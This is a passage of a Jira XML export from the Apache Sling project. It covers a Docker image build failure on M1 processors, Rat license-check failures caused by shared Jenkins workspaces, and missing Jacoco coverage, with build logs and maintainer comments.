                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 16 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16h1k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11426] The apache/sling-cli Docker image cannot be built on M1 processors</title>
                <link>https://issues.apache.org/jira/browse/SLING-11426</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The apache/sling-cli Docker image cannot be built on M1 processors for several reasons:&lt;/p&gt;
&lt;ol&gt;
	&lt;li&gt;the &lt;tt&gt;docker-maven-plugin&lt;/tt&gt; version 37 cannot connect to the Docker unix socket on M1&lt;/li&gt;
	&lt;li&gt;&lt;tt&gt;openjdk-11&lt;/tt&gt; tries to use an &lt;tt&gt;x86_64&lt;/tt&gt; library when &lt;tt&gt;jlink&lt;/tt&gt; is called&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;This can be fixed by updating the &lt;tt&gt;docker-maven-plugin&lt;/tt&gt; to the latest release and updating the JDK to 17, which adds full support for M1 processors.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13469059">SLING-11426</key>
            <summary>The apache/sling-cli Docker image cannot be built on M1 processors</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 29 Jun 2022 08:54:18 +0000</created>
                <updated>Tue, 16 Aug 2022 09:55:24 +0000</updated>
                            <resolved>Tue, 16 Aug 2022 09:55:24 +0000</resolved>
                                                    <fixVersion>Committer CLI 1.0.0</fixVersion>
                                    <component>Tooling</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                    <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13436557">SLING-11234</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 17 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16gi0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11416] Rat license check is including build output</title>
                <link>https://issues.apache.org/jira/browse/SLING-11416</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[INFO] --- apache-rat-plugin:0.13:check (rat-check) @ org.apache.sling.scripting.groovy ---
[INFO] Enabled default license matchers.
[INFO] Will parse SCM ignores for exclusions...
[INFO] Parsing exclusions from /home/jenkins/jenkins-agent/workspace/he-sling-scripting-groovy_master/.gitignore
[INFO] Finished adding exclusions from SCM ignore files.
[INFO] 74 implicit excludes (use -debug for more details).
[INFO] 13 explicit excludes (use -debug for more details).
[INFO] 29 resources included (use -debug for more details)
[INFO] Rat check: Summary over all files. Unapproved: 12, unknown: 12, generated: 0, approved: 14 licenses.
[INFO] Enabled default license matchers.
[INFO] Will parse SCM ignores for exclusions...
[INFO] Parsing exclusions from /home/jenkins/jenkins-agent/workspace/he-sling-scripting-groovy_master/.gitignore
[INFO] Finished adding exclusions from SCM ignore files.
[INFO] 74 implicit excludes (use -debug for more details).
[INFO] 13 explicit excludes (use -debug for more details).
[INFO] 29 resources included (use -debug for more details)
[WARNING] Files with unapproved licenses:
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/maven-metadata.xml
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/maven-metadata.xml
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/maven-metadata.xml.md5
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/org.apache.sling.scripting.groovy-1.2.1-20220620.025330-1-sources.jar.sha1
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/org.apache.sling.scripting.groovy-1.2.1-20220620.025330-1.pom.md5
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/maven-metadata.xml.sha1
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/org.apache.sling.scripting.groovy-1.2.1-20220620.025330-1-sources.jar.md5
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/org.apache.sling.scripting.groovy-1.2.1-20220620.025330-1.jar.sha1
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/org.apache.sling.scripting.groovy-1.2.1-20220620.025330-1.pom.sha1
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/1.2.1-SNAPSHOT/org.apache.sling.scripting.groovy-1.2.1-20220620.025330-1.jar.md5
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/maven-metadata.xml.md5
  local-snapshots-dir/org/apache/sling/org.apache.sling.scripting.groovy/maven-metadata.xml.sha1
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13467966">SLING-11416</key>
            <summary>Rat license check is including build output</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="3">Duplicate</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="olli">Oliver Lietz</reporter>
                        <labels>
                    </labels>
                <created>Fri, 24 Jun 2022 11:06:25 +0000</created>
                <updated>Fri, 24 Jun 2022 12:04:19 +0000</updated>
                            <resolved>Fri, 24 Jun 2022 12:04:19 +0000</resolved>
                                                                    <component>Build and Source Control</component>
                    <component>CI</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17558445" author="kwin" created="Fri, 24 Jun 2022 11:23:10 +0000"  >&lt;p&gt;I think this is a duplicate of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11401&quot; title=&quot;Jenkins: Properly isolate workspace directories for parallel stages&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11401&quot;&gt;&lt;del&gt;SLING-11401&lt;/del&gt;&lt;/a&gt;. &lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                            <outwardlinks description="duplicates">
                                        <issuelink>
            <issuekey id="13453708">SLING-11401</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13453708">SLING-11401</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 17 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z16a5k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11401] Jenkins: Properly isolate workspace directories for parallel stages</title>
                <link>https://issues.apache.org/jira/browse/SLING-11401</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The default workspace name is not unique for parallel stages which run incidentally on the same node. That could lead to race conditions (e.g. between clean and install).&lt;/p&gt;

&lt;p&gt;An example can be found here (&lt;a href=&quot;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-maven-enforcer-rules/job/master/19/console&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-maven-enforcer-rules/job/master/19/console&lt;/a&gt;) where the rat-check was executed on a workspace which was populated by another job.&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[WARNING] Files with unapproved licenses:
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/maven-metadata.xml.sha1
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-metadata.xml.sha1
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-metadata.xml.md5
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-enforcer-rules-1.0.1-20220618.114744-1-sources.jar.sha1
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-enforcer-rules-1.0.1-20220618.114744-1.jar.md5
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-enforcer-rules-1.0.1-20220618.114744-1.pom.sha1
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-enforcer-rules-1.0.1-20220618.114744-1.jar.sha1
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-metadata.xml
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-enforcer-rules-1.0.1-20220618.114744-1.pom.md5
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/1.0.1-SNAPSHOT/maven-enforcer-rules-1.0.1-20220618.114744-1-sources.jar.md5
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/maven-metadata.xml.md5
  local-snapshots-dir/org/apache/sling/maven-enforcer-rules/maven-metadata.xml
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;


&lt;p&gt;Also the Maven repository should not be shared until Maven 3.9 (with Maven Resolver 1.7+) has been released as there is no proper locking in place there (compare with &lt;a href=&quot;https://lists.apache.org/thread/yovswz70v3f4d2b5ofyoqymvg9lbmzrg&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://lists.apache.org/thread/yovswz70v3f4d2b5ofyoqymvg9lbmzrg&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;As the installation to the local repository directory may be executed for multi-module jobs prior to execution of rat-maven-plugin the local repository should be created below &lt;tt&gt;target&lt;/tt&gt; where it is excluded by default (and also cleaned up through a regular &lt;tt&gt;mvn clean&lt;/tt&gt;).&lt;/p&gt;</description>
                <environment></environment>
        <key id="13453708">SLING-11401</key>
            <summary>Jenkins: Properly isolate workspace directories for parallel stages</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Tue, 21 Jun 2022 07:05:41 +0000</created>
                <updated>Thu, 11 Aug 2022 16:01:18 +0000</updated>
                            <resolved>Mon, 27 Jun 2022 17:31:43 +0000</resolved>
                                                                    <component>Build and Source Control</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3000">50m</timespent>
                                <comments>
                            <comment id="17559299" author="kwin" created="Mon, 27 Jun 2022 17:31:43 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-tooling-jenkins/commit/86f64a59ed33c4e7bdbee8150d391d9d27ac8ebb&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-tooling-jenkins/commit/86f64a59ed33c4e7bdbee8150d391d9d27ac8ebb&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17559712" author="kwin" created="Tue, 28 Jun 2022 11:22:19 +0000"  >&lt;p&gt;I had to move the local repository back outside the &lt;tt&gt;target&lt;/tt&gt; directory, as otherwise during multimodule builds the root &lt;tt&gt;target&lt;/tt&gt; is removed by Maven (after being populated by other Maven modules).&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310000">
                    <name>Duplicate</name>
                                                                <inwardlinks description="is duplicated by">
                                        <issuelink>
            <issuekey id="13467966">SLING-11416</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                            <outwardlinks description="causes">
                                        <issuelink>
            <issuekey id="13467966">SLING-11416</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13476417">SLING-11530</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13343241">SLING-9948</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 17 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z13u5k:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11400] Jacoco coverage was missing</title>
                <link>https://issues.apache.org/jira/browse/SLING-11400</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;It seems like, after recent changes, jacoco test coverage was missing on all branches:&#160;&lt;/p&gt;

&lt;p&gt;jacoco test coverage plugin itself is not executing&lt;br/&gt;
&lt;b&gt;jacoco-maven-plugin&lt;/b&gt;&lt;br/&gt;
&#160;&lt;/p&gt;

&lt;p&gt;Example PR: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-sightly-compiler/pull/10&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-sightly-compiler/pull/10&lt;/a&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Build Console: &lt;a href=&quot;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-org-apache-sling-scripting-sightly-compiler/view/change-requests/job/PR-10/1/console&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-org-apache-sling-scripting-sightly-compiler/view/change-requests/job/PR-10/1/console&lt;/a&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13451355">SLING-11400</key>
            <summary>Jacoco coverage was missing</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="ashokmca07@gmail.com">Ashok Pelluru</reporter>
                        <labels>
                    </labels>
                <created>Mon, 20 Jun 2022 14:54:06 +0000</created>
                <updated>Thu, 23 Jun 2022 19:42:42 +0000</updated>
                            <resolved>Tue, 21 Jun 2022 06:30:24 +0000</resolved>
                                                                    <component>Build and Source Control</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="600">10m</timespent>
                                <comments>
                            <comment id="17556423" author="ashokmca07@gmail.com" created="Mon, 20 Jun 2022 15:19:23 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;: Can we directly execute `-Pjacoco-report` at &lt;a href=&quot;https://github.com/apache/sling-tooling-jenkins/blob/master/vars/slingOsgiBundleBuild.groovy#L163&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-tooling-jenkins/blob/master/vars/slingOsgiBundleBuild.groovy#L163&lt;/a&gt; ? so we will get coverage XML files to analyse sonar in the next stage?&#160;&lt;/p&gt;

&lt;p&gt;it&apos;s removed from &lt;a href=&quot;https://github.com/apache/sling-tooling-jenkins/commit/3782cb94c511db8693306ec74d43f678d15d5d0f#diff-b563d1b8523d30b2e9ee4bf280c97142d5f45078b5abd0f31af2751d08512e5aL59&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-tooling-jenkins/commit/3782cb94c511db8693306ec74d43f678d15d5d0f#diff-b563d1b8523d30b2e9ee4bf280c97142d5f45078b5abd0f31af2751d08512e5aL59&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-tooling-jenkins/commit/3782cb94c511db8693306ec74d43f678d15d5d0f#diff-b563d1b8523d30b2e9ee4bf280c97142d5f45078b5abd0f31af2751d08512e5aR223&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-tooling-jenkins/commit/3782cb94c511db8693306ec74d43f678d15d5d0f#diff-b563d1b8523d30b2e9ee4bf280c97142d5f45078b5abd0f31af2751d08512e5aR223&lt;/a&gt; (mvn clean verify is missing to reuse the build artifacts maybe)&lt;/p&gt;</comment>
                            <comment id="17556454" author="kwin" created="Mon, 20 Jun 2022 16:26:45 +0000"  >&lt;p&gt;Good catch &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=ashokmca07%40gmail.com&quot; class=&quot;user-hover&quot; rel=&quot;ashokmca07@gmail.com&quot;&gt;ashokmca07@gmail.com&lt;/a&gt;, indeed using the jacoco profile with just the Sonar goal does not work (&lt;a href=&quot;https://github.com/apache/sling-tooling-jenkins/blob/29716d18807c84a267e58c813ab02135c84ba95d/vars/slingOsgiBundleBuild.groovy#L207&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-tooling-jenkins/blob/29716d18807c84a267e58c813ab02135c84ba95d/vars/slingOsgiBundleBuild.groovy#L207&lt;/a&gt;) is it requires execution of some Maven phases. We have to instead enable that in the preceding Maven build (only for the reference one).&lt;/p&gt;</comment>
                            <comment id="17556666" author="kwin" created="Tue, 21 Jun 2022 06:30:24 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-tooling-jenkins/commit/d29aedf5232123a16d9a9e399a6f24f80761b665&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-tooling-jenkins/commit/d29aedf5232123a16d9a9e399a6f24f80761b665&lt;/a&gt;.&lt;/p&gt;</comment>
